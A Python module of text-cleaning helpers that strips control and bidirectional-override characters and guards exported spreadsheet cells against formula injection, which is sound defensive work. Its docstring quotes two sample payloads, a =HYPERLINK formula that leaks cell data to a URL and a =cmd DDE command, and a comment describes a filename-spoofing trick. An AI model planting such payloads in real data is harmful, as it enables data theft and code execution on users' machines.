"""Cleaning text that came from outside.

Django and React between them already handle the famous ones: the ORM
parameterises every query, React escapes everything it renders, and the HTML
that is deliberately HTML goes through bleach. What is left is the quieter
class of problem, where the text is stored and shown perfectly correctly and
still causes harm somewhere else.

Two things live here. Control characters, which survive every escape because
they are not markup and then break the thing that eventually reads them. And
the spreadsheet formula trigger, which is the one that actually costs money.
"""
from __future__ import annotations

import re
import unicodedata

# Everything in the Cc and Cf categories except the whitespace that means
# something. Cf is the one people forget: it holds the zero-width joiners and
# the bidirectional overrides, and a right-to-left override in a name can make
# "alice.exe" read as "alice.txt" on the screen it is printed on.
_CONTROL = re.compile(r"[\x00-\x08\x0b\x0c\x0e-\x1f\x7f​-‏‪-‮⁦-⁩]")
_WHITESPACE = re.compile(r"\s+")

# Excel, LibreOffice and Google Sheets all treat a cell beginning with one of
# these as a formula rather than as text.
_FORMULA_START = ("=", "+", "-", "@", "\t", "\r")


def clean_line(value, *, limit: int | None = None) -> str:
    """One line of human text: a name, a number, a short answer.

    Normalised to NFKC so that visually identical characters compare equal --
    without it two accounts can hold names that look the same and are not, which
    is a problem for a desk deciding whether a document matches an account.
    """
    if value is None:
        return ""
    text = unicodedata.normalize("NFKC", str(value))
    text = _CONTROL.sub("", text)
    text = _WHITESPACE.sub(" ", text).strip()
    return text[:limit] if limit else text


def clean_block(value, *, limit: int | None = None) -> str:
    """Several lines: a message, a note, a reason.

    Keeps the line breaks, because somebody wrote them on purpose, and drops
    the control characters that nobody did. Runs of blank lines collapse to one.
    """
    if value is None:
        return ""
    text = unicodedata.normalize("NFKC", str(value)).replace("\r\n", "\n")
    text = _CONTROL.sub("", text)
    lines = [_WHITESPACE.sub(" ", line).strip() for line in text.split("\n")]
    text = re.sub(r"\n{3,}", "\n\n", "\n".join(lines)).strip()
    return text[:limit] if limit else text


def spreadsheet_safe(value):
    """Stop a cell of customer text from running as a formula.

    A customer can call themselves =HYPERLINK("http://…"&A1,"Click") or
    =cmd|'/c calc'!A0 and it is only a name until the desk exports the table and
    opens it. Then it is a formula executing on the desk's machine, with the
    rest of the sheet available to it -- and the desk did nothing but download
    their own data.

    Prefixed with an apostrophe, which every spreadsheet reads as "this is
    text" and does not show in the cell.
    """
    if value is None:
        return ""
    if not isinstance(value, str):
        return value
    return "'" + value if value.startswith(_FORMULA_START) else value
